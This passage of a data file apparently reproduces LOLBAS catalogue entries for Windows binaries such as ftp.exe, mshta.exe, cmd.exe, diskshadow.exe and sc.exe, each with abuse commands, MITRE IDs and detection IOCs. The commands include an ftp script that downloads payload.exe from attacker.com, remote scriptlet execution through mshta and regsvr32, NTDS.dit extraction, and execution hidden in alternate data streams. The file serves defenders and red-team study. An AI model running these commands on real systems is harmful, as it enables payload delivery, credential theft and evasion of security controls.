                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_ceddadac8a2b489e\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_d4406f0ad6ec2581\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_d5877a2e0e6374b6\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_d8ca5f86add535ef\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_e8abe176c7b553b5\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_eabb3ac2c517211f\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_f8d8be8fea71e1a0\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_fe5e116bb07c0629\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_fe73d2ebaa05fb95\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64_kbl_kit127397.inf_amd64_e1da8ee9e92ccadb\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\k127153.inf_amd64_364f43f2a27f7bd7\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\k127153.inf_amd64_3f3936d8dec668b8\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\k127793.inf_amd64_3ab7883eddccbf0f\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki129523.inf_amd64_32947eecf8f3e231\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki126950.inf_amd64_fa7f56314967630d\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki126951.inf_amd64_94804e3918169543\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki126973.inf_amd64_06dde156632145e3\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki126974.inf_amd64_9168fc04b8275db9\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki127005.inf_amd64_753576c4406c1193\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki127018.inf_amd64_0f67ff47e9e30716\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki127021.inf_amd64_0d68af55c12c7c17\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki127171.inf_amd64_368f8c7337214025\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki127176.inf_amd64_86c658cabfb17c9c\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki127390.inf_amd64_e1ccb879ece8f084\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki127678.inf_amd64_8427d3a09f47dfc1\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki127727.inf_amd64_cf8e31692f82192e\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki127807.inf_amd64_fc915899816dbc5d\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki127850.inf_amd64_6ad8d99023b59fd5\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki128602.inf_amd64_6ff790822fd674ab\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki128916.inf_amd64_3509e1eb83b83cfb\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki129407.inf_amd64_f26f36ac54ce3076\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki129633.inf_amd64_d9b8af875f664a8c\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki129866.inf_amd64_e7cdca9882c16f55\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki130274.inf_amd64_bafd2440fa1ffdd6\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki130350.inf_amd64_696b7c6764071b63\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki130409.inf_amd64_0d8d61270dfb4560\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki130471.inf_amd64_26ad6921447aa568\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki130624.inf_amd64_d85487143eec5e1a\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki130825.inf_amd64_ee3ba427c553f15f\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki130871.inf_amd64_382f7c369d4bf777\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki131064.inf_amd64_5d13f27a9a9843fa\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki131176.inf_amd64_fb4fe914575fdd15\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki131191.inf_amd64_d668106cb6f2eae0\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki131622.inf_amd64_0058d71ace34db73\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki132032.inf_amd64_f29660d80998e019\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki132337.inf_amd64_223d6831ffa64ab1\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki132535.inf_amd64_7875dff189ab2fa2\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki132544.inf_amd64_b8c1f31373153db4\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki132574.inf_amd64_54c9b905b975ee55\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\ki132869.inf_amd64_052eb72d070df60f\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\kit126731.inf_amd64_1905c9d5f38631d9\\"
                },
            ],
            "Detection": [
                {
                    "IOC": "Usually GfxDownloadWrapper downloads a JSON file from https://gameplayapi.intel.com."
                }
            ],
            "Resources": [{"Link": "https://www.sothis.tech/author/jgalvez/"}],
            "Acknowledgement": [{"Person": "Jesus Galvez", "Handle": None}],
            "pname": "gfxdownloadwrapper",
        },
        {
            "Name": "Mmc.exe",
            "Description": "Load snap-ins to locally and remotely manage Windows systems",
            "Author": "AT_SYMBOLbohops",
            "Created": "2018-12-04",
            "Commands": [
                {
                    "Command": "mmc.exe -Embedding c:\\path\\to\\test.msc",
                    "Description": "Launch a 'backgrounded' MMC process and invoke a COM payload",
                    "Usecase": "Configure a snap-in to load a COM custom class (CLSID) that has been added to the registry",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 10 (and possibly earlier versions)",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\mmc.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\mmc.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/"
                }
            ],
            "Acknowledgement": [{"Person": "Jimmy", "Handle": "AT_SYMBOLbohops"}],
            "pname": "mmc",
        },
        {
            "Name": "Makecab.exe",
            "Description": "Binary to package existing files into a cabinet (.cab) file",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "makecab c:\\ADS\\autoruns.exe c:\\ADS\\cabtest.txt:autoruns.cab",
                    "Description": "Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.",
                    "Usecase": "Hide data compressed into an alternate data stream",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "makecab \\\\webdavserver\\webdav\\file.exe C:\\Folder\\file.txt:file.cab",
                    "Description": "Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.",
                    "Usecase": "Hide data compressed into an alternate data stream",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "makecab \\\\webdavserver\\webdav\\file.exe C:\\Folder\\file.cab",
                    "Description": "Download and compresses the target file and stores it in the target file.",
                    "Usecase": "Download file and compress into a cab file",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\makecab.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\makecab.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "Makecab getting files from Internet"},
                {"IOC": "Makecab storing data into alternate data streams"},
            ],
            "Resources": [
                {
                    "Link": "https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f"
                }
            ],
            "Acknowledgement": [
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"}
            ],
            "pname": "makecab",
        },
        {
            "Name": "Ftp.exe",
            "Description": "A binary designed for connecting to FTP servers",
            "Author": "Oddvar Moe",
            "Created": "2018-12-10",
            "Commands": [
                {
                    "Command": "echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt",
                    "Description": "Executes the commands you put inside the text file.",
                    "Usecase": "Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'cmd.exe /c "AT_SYMBOLecho open attacker.com 21>ftp.txt&AT_SYMBOLecho USER attacker>>ftp.txt&AT_SYMBOLecho PASS PaSsWoRd>>ftp.txt&AT_SYMBOLecho binary>>ftp.txt&AT_SYMBOLecho GET /payload.exe>>ftp.txt&AT_SYMBOLecho quit>>ftp.txt&AT_SYMBOLftp -s:ftp.txt -v"',
                    "Description": "Download",
                    "Usecase": "Spawn new process using ftp.exe. Ftp.exe downloads the binary.",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\ftp.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\ftp.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": "cmd /c as child process of ftp.exe"}],
            "Resources": [
                {"Link": "https://twitter.com/0xAmit/status/1070063130636640256"},
                {
                    "Link": "https://medium.com/AT_SYMBOL0xamit/lets-talk-about-security-research-discoveries-and-proper-discussion-etiquette-on-twitter-10f9be6d1939"
                },
                {"Link": "https://ss64.com/nt/ftp.html"},
                {
                    "Link": "https://www.asafety.fr/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/"
                },
            ],
            "Acknowledgement": [
                {"Person": "Casey Smith", "Handle": "AT_SYMBOLsubtee"},
                {"Person": "BennyHusted", "Handle": ""},
                {"Person": "Amit Serper", "Handle": "AT_SYMBOL0xAmit "},
            ],
            "pname": "ftp",
        },
        {
            "Name": "Microsoft.Workflow.Compiler.exe",
            "Description": "A utility included with .NET that is capable of compiling and executing C# or VB.net code.",
            "Author": "Conor Richard",
            "Created": "2018-10-22",
            "Commands": [
                {
                    "Command": "Microsoft.Workflow.Compiler.exe tests.xml results.xml",
                    "Description": "Compile and execute C# or VB.net code in a XOML file referenced in the test.xml file.",
                    "Usecase": "Compile and run code",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1127",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1127",
                    "OperatingSystem": "Windows 10S",
                },
                {
                    "Command": "Microsoft.Workflow.Compiler.exe tests.txt results.txt",
                    "Description": "Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.",
                    "Usecase": "Compile and run code",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1127",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1127",
                    "OperatingSystem": "Windows 10S",
                },
                {
                    "Command": "Microsoft.Workflow.Compiler.exe tests.txt results.txt",
                    "Description": "Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.",
                    "Usecase": "Compile and run code",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1127",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1127",
                    "OperatingSystem": "Windows 10S",
                },
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe"
                }
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {
                    "IOC": "Microsoft.Workflow.Compiler.exe would not normally be run on workstations."
                },
                {
                    "IOC": "The presence of csc.exe or vbc.exe as child processes of Microsoft.Workflow.Compiler.exe"
                },
                {"IOC": 'Presence of "<CompilerInput" in a text file.'},
            ],
            "Resources": [
                {
                    "Link": "https://twitter.com/mattifestation/status/1030445200475185154"
                },
                {
                    "Link": "https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb"
                },
                {
                    "Link": "https://gist.github.com/mattifestation/3e28d391adbd7fe3e0c722a107a25aba#file-workflowcompilerdetectiontests-ps1"
                },
                {
                    "Link": "https://gist.github.com/mattifestation/7ba8fc8f724600a9f525714c9cf767fd#file-createcompilerinputxml-ps1"
                },
                {
                    "Link": "https://www.forcepoint.com/blog/security-labs/using-c-post-powershell-attacks"
                },
                {
                    "Link": "https://www.fortynorthsecurity.com/microsoft-workflow-compiler-exe-veil-and-cobalt-strike/"
                },
                {
                    "Link": "https://medium.com/AT_SYMBOLBank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15"
                },
            ],
            "Acknowledgement": [
                {"Person": "Matt Graeber", "Handle": "AT_SYMBOLmattifestation"},
                {"Person": "John Bergbom", "Handle": "AT_SYMBOLBergbomJohn"},
                {"Person": "FortyNorth Security", "Handle": "AT_SYMBOLFortyNorthSec"},
                {"Person": "Bank Security", "Handle": "AT_SYMBOLBank_Security"},
            ],
            "pname": "microsoft.workflow.compiler",
        },
        {
            "Name": "Cmd.exe",
            "Description": "The command-line interpreter in Windows",
            "Author": "Ye Yint Min Thu Htut",
            "Created": "2019-06-26",
            "Commands": [
                {
                    "Command": "cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat",
                    "Description": "Add content to an Alternate Data Stream (ADS).",
                    "Usecase": "Can be used to evade defensive countermeasures or to hide as a persistence mechanism",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1170",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1170",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "cmd.exe - < fakefile.doc:payload.bat",
                    "Description": "Execute payload.bat stored in an Alternate Data Stream (ADS).",
                    "Usecase": "Can be used to evade defensive countermeasures or to hide as a persistence mechanism",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1170",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1170",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\cmd.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\cmd.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "cmd.exe executing files from alternate data streams."}
            ],
            "Resources": [
                {"Link": "https://twitter.com/yeyint_mth/status/1143824979139579904"}
            ],
            "Acknowledgement": [{"Person": "r0lan", "Handle": "AT_SYMBOLyeyint_mth"}],
            "pname": "cmd",
        },
        {
            "Name": "Mshta.exe",
            "Description": "Used by Windows to execute html applications. (.hta)",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "mshta.exe evilfile.hta",
                    "Description": "Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.",
                    "Usecase": "Execute code",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1170",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1170",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'mshta.exe vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))',
                    "Description": "Executes VBScript supplied as a command line argument.",
                    "Usecase": "Execute code",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1170",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1170",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();',
                    "Description": "Executes JavaScript supplied as a command line argument.",
                    "Usecase": "Execute code",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1170",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1170",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'mshta.exe "C:\\ads\\file.txt:file.hta"',
                    "Description": "Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.",
                    "Usecase": "Execute code hidden in alternate data stream",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1170",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1170",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10 (Does not work on 1903 and newer)",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\mshta.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\mshta.exe"},
            ],
            "Code_Sample": [
                {
                    "Code": "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct"
                }
            ],
            "Detection": [
                {
                    "IOC": "mshta.exe executing raw or obfuscated script within the command-line"
                },
                {"IOC": "Usage of HTA file"},
            ],
            "Resources": [
                {
                    "Link": "https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4"
                },
                {
                    "Link": "https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct"
                },
                {
                    "Link": "https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/"
                },
                {
                    "Link": "https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/"
                },
            ],
            "Acknowledgement": [
                {"Person": "Casey Smith", "Handle": "AT_SYMBOLsubtee"},
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"},
            ],
            "pname": "mshta",
        },
        {
            "Name": "Pktmon.exe",
            "Description": "Capture Network Packets on the windows 10 with October 2018 Update or later.",
            "Author": "Derek Johnson",
            "Created": "2020-08-12",
            "Commands": [
                {
                    "Command": "pktmon.exe start --etw",
                    "Description": "Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe stop",
                    "Usecase": "use this a built in network sniffer on windows 10 to capture senstive traffic",
                    "Category": "Reconnaissance",
                    "Privileges": "Administrator",
                    "MitreID": "T1040",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1040",
                    "OperatingSystem": "Windows 10 1809 and later",
                },
                {
                    "Command": "pktmon.exe filter add -p 445",
                    "Description": "Select Desired ports for packet capture",
                    "Usecase": "Look for interesting traffic such as telent or FTP",
                    "Category": "Reconnaissance",
                    "Privileges": "Administrator",
                    "MitreID": "T1040",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1040",
                    "OperatingSystem": "Windows 10 1809 and later",
                },
            ],
            "Full_Path": [
                {"Path": "c:\\windows\\system32\\pktmon.exe"},
                {"Path": "c:\\windows\\syswow64\\pktmon.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": ".etl files found on system"}],
            "Resources": [{"Link": "https://binar-x79.com/windows-10-secret-sniffer/"}],
            "Acknowledgement": [{"Person": "Derek Johnson", "Handle": ""}],
            "pname": "pktmon",
        },
        {
            "Name": "Runscripthelper.exe",
            "Description": None,
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "runscripthelper.exe surfacecheck \\\\?\\C:\\Test\\Microsoft\\Diagnosis\\scripts\\test.txt C:\\Test",
                    "Description": "Execute the PowerShell script named test.txt",
                    "Usecase": "Bypass constrained language mode and execute Powershell script",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Windows\\WinSxS\\amd64_microsoft-windows-u..ed-telemetry-client_31bf3856ad364e35_10.0.16299.15_none_c2df1bba78111118\\Runscripthelper.exe"
                },
                {
                    "Path": "CC:\\Windows\\WinSxS\\amd64_microsoft-windows-u..ed-telemetry-client_31bf3856ad364e35_10.0.16299.192_none_ad4699b571e00c4a\\Runscripthelper.exe"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "Event 4014 - Powershell logging"},
                {"IOC": "Event 400"},
            ],
            "Resources": [
                {
                    "Link": "https://posts.specterops.io/bypassing-application-whitelisting-with-runscripthelper-exe-1906923658fc"
                }
            ],
            "Acknowledgement": [
                {"Person": "Matt Graeber", "Handle": "AT_SYMBOLmattifestation"}
            ],
            "pname": "runscripthelper",
        },
        {
            "Name": "Extexport.exe",
            "Description": None,
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "Extexport.exe c:\\test foo bar",
                    "Description": "Load a DLL located in the c:\\test folder with one of the following names mozcrt19.dll, mozsqlite3.dll, or sqlite.dll",
                    "Usecase": "Execute dll file",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Program Files\\Internet Explorer\\Extexport.exe"},
                {"Path": "C:\\Program Files (x86)\\Internet Explorer\\Extexport.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {
                    "IOC": "Extexport.exe loads dll and is execute from other folder the original path"
                }
            ],
            "Resources": [
                {
                    "Link": "http://www.hexacorn.com/blog/2018/04/24/extexport-yet-another-lolbin/"
                }
            ],
            "Acknowledgement": [{"Person": "Adam", "Handle": "AT_SYMBOLhexacorn"}],
            "pname": "extexport",
        },
        {
            "Name": "Diskshadow.exe",
            "Description": "Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "diskshadow.exe /s c:\\test\\diskshadow.txt",
                    "Description": "Execute commands using diskshadow.exe from a prepared diskshadow script.",
                    "Usecase": "Use diskshadow to exfiltrate data from VSS such as NTDS.dit",
                    "Category": "Dump",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows server",
                },
                {
                    "Command": "diskshadow> exec calc.exe",
                    "Description": "Execute commands using diskshadow.exe to spawn child process",
                    "Usecase": "Use diskshadow to bypass defensive counter measures",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1003",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1003",
                    "OperatingSystem": "Windows server",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\diskshadow.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\diskshadow.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "Child process from diskshadow.exe"},
                {"IOC": "Diskshadow reading input from file"},
            ],
            "Resources": [
                {
                    "Link": "https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/"
                }
            ],
            "Acknowledgement": [{"Person": "Jimmy", "Handle": "AT_SYMBOLbohops"}],
            "pname": "diskshadow",
        },
        {
            "Name": "Sc.exe",
            "Description": "Used by Windows to manage services",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": 'sc create evilservice binPath="\\"c:\\\\ADS\\\\file.txt:cmd.exe\\" /c echo works > \\"c:\\ADS\\works.txt\\"" DisplayName= "evilservice" start= auto\\ & sc start evilservice',
                    "Description": "Creates a new service and executes the file stored in the ADS.",
                    "Usecase": "Execute binary file hidden inside an alternate data stream",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\sc.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\sc.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": "Services that gets created"}],
            "Resources": [
                {
                    "Link": "https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/"
                }
            ],
            "Acknowledgement": [
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"}
            ],
            "pname": "sc",
        },
        {
            "Name": "Presentationhost.exe",
            "Description": "File is used for executing Browser applications",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "Presentationhost.exe C:\\temp\\Evil.xbap",
                    "Description": "Executes the target XAML Browser Application (XBAP) file",
                    "Usecase": "Execute code within xbap files",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\Presentationhost.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\Presentationhost.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf"
                },
                {
                    "Link": "https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/"
                },
            ],
            "Acknowledgement": [{"Person": "Casey Smith", "Handle": "AT_SYMBOLsubtee"}],
            "pname": "presentationhost",
        },
        {
            "Name": "Msdt.exe",
            "Description": "Microsoft diagnostics tool",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af C:\\PCW8E57.xml /skip TRUE",
                    "Description": "Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the PCW8E57.xml file.",
                    "Usecase": "Execute code",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af C:\\PCW8E57.xml /skip TRUE",
                    "Description": "Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the PCW8E57.xml file.",
                    "Usecase": "Execute code bypass Application whitelisting",
                    "Category": "AWL bypass",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\Msdt.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\Msdt.exe"},
            ],
            "Code_Sample": [
                {
                    "Code": "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/PCW8E57.xml"
                }
